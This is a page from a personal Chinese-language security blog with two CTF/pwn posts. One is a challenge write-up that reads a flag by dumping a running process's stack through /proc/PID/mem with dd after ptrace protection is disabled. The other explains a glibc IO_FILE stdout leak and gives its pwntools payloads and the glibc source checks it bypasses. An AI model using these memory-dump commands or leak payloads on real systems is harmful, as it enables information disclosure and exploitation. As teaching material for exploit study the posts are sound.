<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;INIT SCRIPT&quot;</span></span><br><span class="line"><span class="built_in">mkdir</span> /tmp</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">mount -t debugfs none /sys/kernel/debug</span><br><span class="line">mount -t tmpfs none /tmp</span><br><span class="line"><span class="built_in">echo</span> 0 | <span class="built_in">tee</span> /proc/sys/kernel/yama/ptrace_scope</span><br><span class="line"><span class="built_in">chown</span> 0:0 flag</span><br><span class="line"><span class="built_in">chmod</span> 755 flag</span><br><span class="line"><span class="built_in">exec</span> 0&lt;/dev/console</span><br><span class="line"><span class="built_in">exec</span> 1&gt;/dev/console</span><br><span class="line"><span class="built_in">exec</span> 2&gt;/dev/console</span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;Boot took <span class="subst">$(cut -d&#x27; &#x27; -f1 /proc/uptime)</span> seconds&quot;</span></span><br><span class="line">./target &gt;pso.file 2&gt;&amp;1 &amp;</span><br><span class="line">setsid /bin/cttyhack setuidgid 0 /bin/sh</span><br><span class="line"><span class="comment">#setsid /bin/cttyhack setuidgid 0 /bin/sh # ä¿®æ”¹ uid gid ä¸º 0 ä»¥ææƒ /bin/sh è‡³ rootã€‚</span></span><br></pre></td></tr></table></figure>
<p>å…¶ä¸­è¿™ä¸€å¥echo 0 | tee /proc/sys/kernel/yama/ptrace_scope</p>
<p>å…³é—­äº†ptraceçš„ä¿æŠ¤ï¼ŒåŸæœ¬é»˜è®¤ä¸º1ï¼Œä½¿å¾—ptraceåªèƒ½è¿½è¸ªçˆ¶è¿›ç¨‹</p>
<p>ä½†æ˜¯è®¾ä¸º0å³å¯è¿½è¸ªæ‰€æœ‰è¿›ç¨‹</p>
<p>æ‰€ä»¥å¯ä»¥</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ps -ef -&gt;æ‰¾åˆ°./targetè¿›ç¨‹çš„pid (IDAåˆ†æ./targetå‘ç°flagå·²ç»è¯»åˆ°æ ˆé‡Œï¼Œå¹¶ä¸”ä¹‹å<span class="keyword">while</span> 1æ­»å¾ªç¯</span><br><span class="line"><span class="built_in">cat</span> /proc/$(pidof target)/mapsæ‰¾åˆ°æ ˆèµ·å§‹æœ«å°¾åœ°å€</span><br><span class="line"><span class="built_in">dd</span>æŒ‡ä»¤å¯ä»¥åˆ†æå†…å­˜</span><br><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=/proc/$(pidof target)/mem skip=æ ˆèµ·å§‹åœ°å€ bs=1(æ¯æ¬¡1bytes) count=135168(æ€»å…±) |grep ...</span><br></pre></td></tr></table></figure>
<p>ä¸€æ­¥åˆ°ä½ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">stack=$(<span class="built_in">printf</span> %d <span class="string">&quot;0x<span class="subst">$(grep stack /proc/$(pidof target)</span>/maps | sed -n &#x27;s/^\([0-9a-f]*\)-.*$/\1/p&#x27;)&quot;</span>)</span><br><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=/proc/$(pidof target)/mem skip=<span class="variable">$stack</span> bs=1 count=135168|grep cyber</span><br></pre></td></tr></table></figure>
<p><img src="./images/catctf-injection-pics/Untitled.png" alt="Untitled"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/09/24/IO-FILE-leak/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/header.png">
      <meta itemprop="name" content="hkbin">
      <meta itemprop="description" content="hkbin hkbin hkbin">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hkbinçš„å°åšå®¢~">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/09/24/IO-FILE-leak/" class="post-title-link" itemprop="url">IO_FILE_leak</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>
              

              <time title="åˆ›å»ºæ—¶é—´ï¼š2023-09-24 11:12:11 / ä¿®æ”¹æ—¶é—´ï¼š11:13:15" itemprop="dateCreated datePublished" datetime="2023-09-24T11:12:11+08:00">2023-09-24</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">åˆ†ç±»äº</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="æœ¬æ–‡å­—æ•°">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>811</span>
            </span>
            <span class="post-meta-item" title="é˜…è¯»æ—¶é•¿">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>3 åˆ†é’Ÿ</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="IO-FILE-leakæ˜¯ä¸€ç§åˆ©ç”¨IO-FILEæ¥è¾¾åˆ°leakæ•ˆæœçš„æ‰‹æ³•">IO_FILE_leakæ˜¯ä¸€ç§åˆ©ç”¨IO_FILEæ¥è¾¾åˆ°leakæ•ˆæœçš„æ‰‹æ³•</h3>
<h2 id="åˆ©ç”¨æ–¹å¼ï¼š">åˆ©ç”¨æ–¹å¼ï¼š</h2>
<p><strong>é’ˆå¯¹_IO_2_1_stdout_ç»“æ„ä½“</strong></p>
<p>_flagsæ”¹ä¸º0xfbad1800</p>
<p>_IO_read_ptr = 0</p>
<p>_IO_read_end = 0</p>
<p>_IO_read_base = 0</p>
<p>_IO_write_baseæœ«å­—èŠ‚æ”¹ä¸º0x58</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="title function_">p64</span>(<span class="number">0xfbad1800</span>)+<span class="title function_">p64</span>(<span class="number">0</span>)*<span class="number">3</span>+b<span class="string">&quot;\x58&quot;</span></span><br></pre></td></tr></table></figure>
<p>å½“ç¨‹åºè°ƒç”¨_IO_2_1_stdoutçš„æ—¶å€™å°±ä¼šè¾“å‡º_IO_write_baseåˆ°_IO_write_pträ¹‹é—´çš„å†…å®¹</p>
<hr>
<p>å¦å¤–ä¸€ç§åˆ©ç”¨æ‰‹æ³•</p>
<p>å¦‚ç”¨ä¸‹é¢payloadï¼Œåˆ™ä¼šæ³„éœ²_IO_2_1_stdin_(å¯¹äºputså‡½æ•°â†’ä¸åŒå‡½æ•°è¾“å‡ºä¸åŒ)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(<span class="number">0xfbad3887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p8(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<h2 id="åŸç†">åŸç†</h2>
<p>å¯¹äºè¾“å‡ºå‡½æ•°æ¥è¯´ï¼Œæ¯”å¦‚puts</p>
<p>å…¶è°ƒç”¨æµä¸º</p>
<p>_IO_putsâ†’_IO_sputnâ†’_IO_XSPUTN(vtable)â†’_IO_OVERFLOW(å½“ç¼“å†²åŒºè¿˜æœ‰ä¸œè¥¿çš„æ—¶å€™)â†’_IO_do_writeâ†’_IO_new_do_write</p>
<p>è€Œå½“_IO_write_end &gt; _IO_write_ptræ—¶ï¼Œä¼šè°ƒç”¨memcpyæ‹·è´æ•°æ®åˆ°ç¼“å†²åŒºï¼Œä¹‹ååˆ¤æ–­æ˜¯å¦æœ‰å‰©ä½™ï¼Œä¹Ÿå°±æ˜¯æ‹·è´äº†å°±ä¼šè°ƒç”¨_IO_overflow</p>
<p>ç¼“å†²åŒºæœºåˆ¶ï¼šè¾“å‡ºæ•°æ®ä¼šå…ˆæ”¾åˆ°ç¼“å†²åŒºï¼Œç„¶åç¼“å†²åŒºå†å‘é€ç»™ç”¨æˆ·ï¼Œæ¯”å¦‚å¾€ç¼“å†²åŒºæ¨äº†0x50ä¸ªæ•°æ®ï¼Œä½†æ˜¯åªwriteäº†0x40ä¸ªæ•°æ®ï¼Œè¿™ä¸ªæ—¶å€™ç¼“å†²åŒºå°±ä¼šæœ‰å‰©ä½™ï¼Œåœ¨ä¸‹ä¸€æ¬¡è¾“å‡ºçš„æ—¶å€™ï¼Œå°†ä¼šè¾“å‡ºå®Œå‰©ä½™çš„å†…å®¹ï¼Œè€Œä¸æ˜¯è¿™æ¬¡è¦è¾“å‡ºçš„å†…å®¹ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> _IO_new_file_overflow (_IO_FILE *f, <span class="type">int</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_doallocbuf (f);</span><br><span class="line">      _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">    &#125;</span><br><span class="line">      <span class="comment">/* Otherwise must be currently reading.</span></span><br><span class="line"><span class="comment">     If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,</span></span><br><span class="line"><span class="comment">     logically slide the buffer forwards one block (by setting the</span></span><br><span class="line"><span class="comment">     read pointers to all point at the beginning of the block).  This</span></span><br><span class="line"><span class="comment">     makes room for subsequent output.</span></span><br><span class="line"><span class="comment">     Otherwise, set the read pointers to _IO_read_end (leaving that</span></span><br><span class="line"><span class="comment">     alone, so it can continue to correspond to the external position). */</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (_IO_in_backup (f)))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">size_t</span> nbackup = f-&gt;_IO_read_end - f-&gt;_IO_read_ptr;</span><br><span class="line">      _IO_free_backup_area (f);</span><br><span class="line">      f-&gt;_IO_read_base -= MIN (nbackup,</span><br><span class="line">                   f-&gt;_IO_read_base - f-&gt;_IO_buf_base);</span><br><span class="line">      f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)</span><br><span class="line">    f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;</span><br><span class="line">      f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;</span><br><span class="line">      f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;</span><br><span class="line">      f-&gt;_IO_write_end = f-&gt;_IO_buf_end;</span><br><span class="line">      f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;</span><br><span class="line"></span><br><span class="line">      f-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">    f-&gt;_IO_write_end = f-&gt;_IO_write_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (ch == EOF)</span><br><span class="line">    <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">             f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) <span class="comment">/* Buffer is really full */</span></span><br><span class="line">............</span><br></pre></td></tr></table></figure>
<p>æˆ‘ä»¬çš„ç›®æ ‡æ˜¯è°ƒç”¨åˆ°_IO_do_writeå°†æ•°æ®æ‰“å°å‡ºæ¥</p>
<p>éœ€è¦ç»•è¿‡çš„æ£€æŸ¥ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">f-&gt;_flags &amp; _IO_NO_WRITES == False</span><br><span class="line">((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>) == False</span><br><span class="line"></span><br><span class="line">æ»¡è¶³ä¸Šè¿°æ¡ä»¶ _flags &amp; <span class="number">8</span> == <span class="number">0</span> , _flags &amp; <span class="number">0x800</span> == <span class="number">1</span>ï¼Œä¸” _flags é­”æ•°çš„å¸¸é‡ä¸º <span class="number">0xfbad0000</span>ã€‚ é‚£ä¹ˆæ­¤æ—¶ _flags == <span class="number">0xfbad0800</span></span><br></pre></td></tr></table></figure>
<p>ä¸€äº›å®å®šä¹‰ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_MAGIC 0xFBAD0000 <span class="comment">/* Magic number */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _OLD_STDIO_MAGIC 0xFABC0000 <span class="comment">/* Emulate old stdio. */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_MAGIC_MASK 0xFFFF0000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_USER_BUF 1 <span class="comment">/* User owns buffer; don&#x27;t delete it on close. */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_UNBUFFERED 2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_NO_READS 4 <span class="comment">/* Reading not allowed */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_NO_WRITES 8 <span class="comment">/* Writing not allowd */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_EOF_SEEN 0x10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_ERR_SEEN 0x20</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_DELETE_DONT_CLOSE 0x40 <span class="comment">/* Don&#x27;t call close(_fileno) on cleanup. */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_LINKED 0x80 <span class="comment">/* Set if linked (using _chain) to streambuf::_list_all.*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_IN_BACKUP 0x100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_LINE_BUF 0x200</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_TIED_PUT_GET 0x400 <span class="comment">/* Set if put and get pointer logicly tied. */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_CURRENTLY_PUTTING 0x800</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_IS_APPENDING 0x1000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_IS_FILEBUF 0x2000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_BAD_SEEN 0x4000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_USER_LOCK 0x8000</span></span><br></pre></td></tr></table></figure>
<p>æ¥ç€è¿›å…¥_IO_new_do_write</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span></span><br><span class="line">_IO_size_t</span><br><span class="line"><span class="title function_">new_do_write</span> <span class="params">(_IO_FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, _IO_size_t to_do)</span></span><br><span class="line">&#123;</span><br><span class="line">  _IO_size_t count;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">    <span class="comment">/* On a system without a proper O_APPEND implementation,</span></span><br><span class="line"><span class="comment">       you would need to sys_seek(0, SEEK_END) here, but is</span></span><br><span class="line"><span class="comment">       not needed nor desirable for Unix- or Posix-like systems.</span></span><br><span class="line"><span class="comment">       Instead, just indicate that offset (before and after) is</span></span><br><span class="line"><span class="comment">       unpredictable. */</span></span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_off64_t new_pos</span><br><span class="line">    = _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (new_pos == _IO_pos_BAD)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      fp-&gt;_offset = new_pos;</span><br><span class="line">    &#125;</span><br><span class="line">  count = _IO_SYSWRITE (fp, data, to_do);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_cur_column &amp;&amp; count)</span><br><span class="line">    fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - <span class="number">1</span>, data, count) + <span class="number">1</span>;</span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= <span class="number">0</span></span><br><span class="line">               &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">               ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end);</span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ç›®æ ‡æ˜¯è°ƒç”¨åˆ°_IO_SYSWRITE</p>
<p>æ ¡éªŒï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fp-&gt;_flags &amp; _IO_IS_APPENDING == FALSE</span><br><span class="line">fp-&gt;_IO_read_end != fp-&gt;_IO_write_base == FALSE</span><br></pre></td></tr></table></figure>
<p>æ‰€ä»¥_flagsä½è®¾ä¸º0xfbad1800å³å¯</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-angle-left" aria-label="ä¸Šä¸€é¡µ"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/4/"><i class="fa fa-angle-right" aria-label="ä¸‹ä¸€é¡µ"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          æ–‡ç« ç›®å½•
        </li>
        <li class="sidebar-nav-overview">
          ç«™ç‚¹æ¦‚è§ˆ
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="hkbin"
      src="/images/header.png">
  <p class="site-author-name" itemprop="name">hkbin</p>
  <div class="site-description" itemprop="description">hkbin hkbin hkbin</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">32</span>
          <span class="site-state-item-name">æ—¥å¿—</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">7</span>
        <span class="site-state-item-name">åˆ†ç±»</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">39</span>
        <span class="site-state-item-name">æ ‡ç­¾</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="/17779938@qq.com" title="QQ â†’ 17779938@qq.com"><i class="fab fa-stack-overflow fa-fw"></i>QQ</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://github.com/Hkhanbing" title="GitHub â†’ https:&#x2F;&#x2F;github.com&#x2F;Hkhanbing" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">hkbin</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
      <span class="post-meta-item-text">ç«™ç‚¹æ€»å­—æ•°ï¼š</span>
    <span title="ç«™ç‚¹æ€»å­—æ•°">140k</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
      <span class="post-meta-item-text">ç«™ç‚¹é˜…è¯»æ—¶é•¿ &asymp;</span>
    <span title="ç«™ç‚¹é˜…è¯»æ—¶é•¿">8:29</span>
</div>
  <div class="powered-by">Sponsored by DKdun
  </div>


    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<script color="0,0,255" opacity="0.5" zIndex="-1" count="99" src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js"></script>



        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="æ€»è®¿å®¢é‡">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="æ€»è®¿é—®é‡">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  
  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>


  <script defer src="/lib/three/three.min.js"></script>
    <script defer src="/lib/three/canvas_lines.min.js"></script>


  















  

  

  

</body>
</html>
